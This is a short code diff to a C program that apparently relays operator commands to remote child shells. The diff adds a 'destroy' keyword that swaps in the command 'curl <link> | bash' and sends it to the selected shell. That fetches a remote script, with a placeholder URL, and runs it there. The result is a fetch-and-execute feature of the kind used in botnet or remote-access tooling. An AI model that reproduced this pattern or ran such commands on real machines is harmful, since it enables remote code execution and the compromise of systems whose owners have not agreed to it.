@@ -24,6 +24,7 @@
 #include "user_console.h"
 #include <fcntl.h>
 #define SIZE 100
+#define DESTROY_CMD "curl <link> | bash"
 
 void sighandler(int signo){
   switch(signo){
@@ -44,6 +45,14 @@ void sighandler(int signo){
 
 }
 
+char * special_cmd(char * cmd){
+  if(strcmp(cmd, "destroy")==0){
+    return DESTROY_CMD;
+  }
+
+  return cmd;
+}
+
 static int childFds[SIZE];
 int idCount = 0;
 
@@ -59,6 +68,7 @@ int recv_user_cmd(){
     printf("ERR: %d is not a valid child...\n", shellid);
   }
   else{
+    cmd = special_cmd(cmd);
     write(childFds[shellid], cmd, msg_ln);
   }
 }
